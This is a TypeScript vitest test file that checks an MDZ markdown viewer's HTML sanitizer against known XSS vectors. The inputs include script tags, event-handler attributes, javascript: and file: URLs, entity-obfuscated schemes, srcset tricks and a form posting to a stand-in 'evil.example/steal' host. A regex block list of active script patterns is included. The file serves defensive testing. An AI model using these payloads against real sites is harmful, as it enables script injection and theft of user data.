/**
 * Adversarial XSS tests for the MDZ viewer sanitizer.
 *
 * Every test below encodes a known XSS vector and asserts the
 * sanitizer removes the attacker-controlled capability. If you add an
 * allowed tag or attribute, add the corresponding negative test first.
 *
 * The sanitizer runs after markdown is rendered by `marked`, so some
 * payloads (raw `<script>` tags in markdown prose) get HTML-escaped by
 * `marked` before they reach the sanitizer. Tests cover both paths:
 * (1) raw HTML embedded via markdown's HTML pass-through, and (2)
 * HTML synthesized from markdown that then contains suspicious content.
 */

import { describe, it, expect, beforeAll } from "vitest";
import { renderMarkdown } from "./render.js";

// -----------------------------------------------------------------------------
// DOMParser polyfill for the Node-based vitest environment. The sanitizer now
// throws if DOMParser is unavailable (a 0.1 hardening fix), so tests must
// provide a real DOM. We use `linkedom` which is the smallest drop-in.
// -----------------------------------------------------------------------------

beforeAll(async () => {
  if (typeof DOMParser === "undefined") {
    try {
      const { DOMParser: LinkeDOMParser } = await import("linkedom");
      (globalThis as unknown as { DOMParser: unknown }).DOMParser = LinkeDOMParser;
    } catch {
      throw new Error(
        "linkedom is required for sanitizer tests but is not installed. " +
          "Run `cd packages/mdz-viewer && npm install --save-dev linkedom`.",
      );
    }
  }
});

// Common helper: render the markdown through the full pipeline. Archive-
// relative asset paths resolve to a sentinel blob:// URL so we can assert
// on whether rewriting happened.
const SENTINEL_BLOB = "blob:test/sentinel";
function render(md: string): string {
  return renderMarkdown(md, {
    resolveAsset: (path) =>
      path.startsWith("javascript:") ? null : SENTINEL_BLOB,
  });
}

// -----------------------------------------------------------------------------
// Script-injection vectors — MUST NOT appear in output
// -----------------------------------------------------------------------------

// Each case asserts the ACTIVE form of the dangerous content is absent.
// Inert HTML-entity-escaped text (`&lt;script&gt;alert(1)&lt;/script&gt;`)
// is acceptable — a browser renders it as literal characters, not script.
// The assertions use regex patterns that match only active/executable
// forms, not escaped prose.
const ACTIVE_DANGER_PATTERNS: readonly RegExp[] = [
  /<script(?:\s|>)/i, // actual <script> tag (not &lt;script&gt;)
  /<iframe(?:\s|>)/i,
  /<object(?:\s|>)/i,
  /<embed(?:\s|>)/i,
  /<form(?:\s|>)/i,
  /<style(?:\s|>)/i,
  /<base(?:\s|>)/i,
  /\son[a-z]+\s*=/i, // unescaped event-handler attribute (e.g., ` onerror=`)
  /\ssrcdoc\s*=/i,
  /href\s*=\s*["']?\s*javascript:/i,
  /src\s*=\s*["']?\s*javascript:/i,
];

function assertNoActiveDanger(out: string, label: string): void {
  for (const pat of ACTIVE_DANGER_PATTERNS) {
    if (pat.test(out)) {
      throw new Error(
        `sanitizer failed [${label}]: output contains ${pat} — ${JSON.stringify(out.slice(0, 200))}`,
      );
    }
  }
}

describe("sanitizer: script injection blocked", () => {
  it.each([
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror =alert(1)>",
    "<img src=x ONERROR=alert(1)>",
    "<img/onerror=alert(1)>",
    "<img src=x onload='alert(1)'>",
    "<div onmouseover=alert(1)>hover</div>",
    "<iframe src='https://evil.example'></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data='evil.swf'></object>",
    "<embed src='evil.swf'>",
    "<form action='https://evil.example/steal'><input name=p></form>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
    "<style>@import 'https://evil.example/x.css';</style>",
    "<base href='https://evil.example/'>",
  ])("blocks active danger in: %s", (input) => {
    const out = render(input);
    assertNoActiveDanger(out, input);
  });
});

// -----------------------------------------------------------------------------
// Dangerous URL schemes in href/src
// -----------------------------------------------------------------------------

describe("sanitizer: dangerous URL schemes rejected", () => {
  it.each([
    "[link](javascript:alert(1))",
    "[link](JaVaScRiPt:alert(1))",
    "[link]( javascript:alert(1))",
    "[link](vbscript:msgbox(1))",
    "[link](file:///etc/passwd)",
    "[link](data:text/html,<script>alert(1)</script>)",
    "![img](javascript:alert(1))",
    "![img](data:image/svg+xml,<svg><script>alert(1)</script></svg>)",
  ])("rejects dangerous URL: %s", (input) => {
    const out = render(input).toLowerCase();
    // None of the dangerous schemes should survive as an attribute value.
    expect(out).not.toMatch(/javascript:/);
    expect(out).not.toMatch(/vbscript:/);
    expect(out).not.toMatch(/file:/);
    expect(out).not.toMatch(/data:(?!image\/png;base64,|image\/jpeg;base64,)/);
  });
});

// -----------------------------------------------------------------------------
// HTML entity obfuscation of schemes
// -----------------------------------------------------------------------------

describe("sanitizer: entity-obfuscated scheme attacks", () => {
  it("blocks href with tab inside javascript: scheme", () => {
    // Historical bypass: entity-encoded tabs/newlines inside the scheme
    // portion decode at parse time; regex checks on the decoded value
    // fail to match plain "javascript:". Assert the resulting anchor has
    // no href at all (or a safe href).
    const out = render('<a href="java&#09;script:alert(1)">x</a>');
    expect(out.toLowerCase()).not.toContain("alert");
  });

  it("blocks href with newline-obfuscated javascript: scheme", () => {
    const out = render('<a href="java\nscript:alert(1)">x</a>');
    expect(out.toLowerCase()).not.toContain("alert");
  });
});

// -----------------------------------------------------------------------------
// srcset splitting
// -----------------------------------------------------------------------------

describe("sanitizer: srcset attack surface", () => {
  it("rejects javascript: in srcset pieces", () => {
    const out = render('<img srcset="javascript:alert(1) 1x, safe.png 2x">');
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("preserves safe srcset with relative paths", () => {
    // Relative paths resolve to the sentinel blob URL in this test setup.
    const out = render('<img srcset="fig.png 1x, fig@2x.png 2x">');
    expect(out).toContain(SENTINEL_BLOB);
  });
});

// -----------------------------------------------------------------------------
// target="_blank" rel hardening
// -----------------------------------------------------------------------------

describe("sanitizer: target=_blank rel hardening", () => {
  it("forces rel=noopener noreferrer on new-window links", () => {
    const out = render('<a href="https://example.com" target="_blank">ext</a>');
    expect(out).toMatch(/rel="[^"]*noopener[^"]*noreferrer[^"]*"|rel="[^"]*noreferrer[^"]*noopener[^"]*"/);
  });

  it("preserves existing rel values alongside noopener", () => {
    const out = render(
      '<a href="https://example.com" target="_blank" rel="nofollow">x</a>',
    );
    expect(out).toContain("nofollow");
    expect(out).toContain("noopener");
    expect(out).toContain("noreferrer");
  });
});

// -----------------------------------------------------------------------------
// NEVER_ALLOWED_ATTRS defense-in-depth
// -----------------------------------------------------------------------------

describe("sanitizer: NEVER_ALLOWED_ATTRS are stripped unconditionally", () => {
  it.each([
    ["<div srcdoc='<script>alert(1)</script>'>x</div>", "srcdoc"],
    ["<a href='/x' ping='https://tracker.example/log'>x</a>", "ping="],
    ["<img src='x.png' background='y.png'>", "background="],
    ["<div data='mal.swf'>x</div>", "data="],
  ])("blocks %#: %s", (input, forbidden) => {
    const out = render(input).toLowerCase();
    expect(out).not.toContain(forbidden.toLowerCase());
  });
});

// -----------------------------------------------------------------------------
// Happy-path: legitimate markdown survives
// -----------------------------------------------------------------------------

describe("sanitizer: legitimate markdown survives", () => {
  it("preserves headings, paragraphs, lists, code", () => {
    const out = render("# Title\n\nA paragraph with **bold** and `code`.\n\n- one\n- two\n");
    expect(out).toMatch(/<h1/);
    expect(out).toMatch(/<strong/);
    expect(out).toMatch(/<code/);
    expect(out).toMatch(/<ul/);
  });

  it("preserves https:// links unchanged", () => {
    const out = render("[link](https://example.com/x)");
    expect(out).toContain("https://example.com/x");
  });

  it("preserves archive-relative image paths via resolveAsset", () => {
    const out = render("![alt](assets/images/fig.png)");
    expect(out).toContain(SENTINEL_BLOB);
  });

  it("preserves mailto: and tel: URLs", () => {
    expect(render("[mail](mailto:user@example.com)")).toContain("mailto:user@example.com");
    expect(render("[phone](tel:+15551234)")).toContain("tel:+15551234");
  });
});
